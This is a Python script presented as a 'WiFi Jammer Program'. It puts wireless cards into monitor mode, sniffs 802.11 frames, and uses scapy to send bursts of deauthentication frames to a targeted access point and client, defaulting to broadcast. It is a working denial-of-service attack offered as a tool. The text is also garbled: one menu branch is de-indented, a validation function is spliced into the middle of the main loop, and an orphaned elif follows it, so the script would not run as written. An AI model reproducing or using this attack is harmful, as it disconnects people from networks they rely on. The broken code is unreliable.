import scapy.all as scapy
import subprocess
import os

def autodetect_wifi_cards():
    try:
        output = subprocess.check_output(["iw", "dev"]).decode("utf-8")
        print("iw command output:")
        print(output)  # Verify the output
    except subprocess.CalledProcessError as e:
        print(f"Error executing 'iw' command: {e}")
        return []

    wifi_cards = []
    for line in output.splitlines():
        if "Interface" in line:
            # Improved line parsing logic
            parts = line.split()
            for part in parts:
                if part not in ["Interface", "phy#"]:
                    wifi_card = part.strip()
                    wifi_cards.append(wifi_card)
                    try:
                        # Put card into monitor mode
                        subprocess.call(["sudo", "iw", wifi_card, "set", "monitor", "on"])
                    except subprocess.CalledProcessError as e:
                        print(f"Error setting {wifi_card} to monitor mode: {e}")
    return wifi_cards

# ... (this part above caused a lot of trouble!)


# **Scapy-based Sniffing**
def sniff_packets(interface):
    scapy.sniff(iface=interface, prn=packet_handler)

# **Packet Handler**
def packet_handler(packet):
    if packet.haslayer(scapy.Dot11):
        print(f"Captured packet from {packet[scapy.Dot11].addr2}")

# **Packet Injection Logic (Deauthentication Attack)**
def inject_deauth_packets(interface, target_ap, target_client):
    packet = scapy.Dot11(type=0, subtype=12, addr1=target_client, addr2=target_ap, addr3=target_ap) / scapy.Dot11Deauth(reason=7)
    scapy.sendp(packet, iface=interface, count=100, inter=0.1, verbose=False)

# **Main Program**
def main():
    print("ace0653's WiFi Jammer Program")
    print("-----------------------------------")

    # Autodetect WiFi cards and put them into monitor mode
    wifi_cards = autodetect_wifi_cards()
    if wifi_cards:
        print(f"Detected WiFi cards: {wifi_cards}")
    else:
        print("No WiFi cards detected. Exiting.")
        return

    while True:
        print("\nMenu:")
        print("1. Sniff packets on a WiFi card")
        print("2. Inject deauthentication packets (jam a network)")
        print("3. Exit")

        choice = input("Enter your choice: ")

        if choice == "1":
            interface = input("Enter the WiFi card to sniff (e.g., wlan0): ")
            sniff_packets(interface)
        elif choice == "2":
    interface = input("Enter the WiFi card to use for injection (e.g., wlan0): ")
    while True:
        try:
            target_ap = input("Enter the target AP's MAC address: ")
            if not validate_mac_address(target_ap):
                print("Invalid MAC address. Please try again (e.g., 00:11:22:33:44:55).")
            else:
                break
        except (KeyboardInterrupt, EOFError):
            print("\nInput interrupted. Exiting.")
            return

    target_client = input("Enter the target client's MAC address (or leave blank for broadcast): ")
    if not target_client:
        target_client = "ff:ff:ff:ff:ff:ff"
    inject_deauth_packets(interface, target_ap, target_client)

# **MAC Address Validation Function**
import re

def validate_mac_address(mac_address):
    pattern = r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"
    return bool(re.match(pattern, mac_address))
        elif choice == "3":
            print("Exiting. May the WiFi signals be ever in your favor.")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
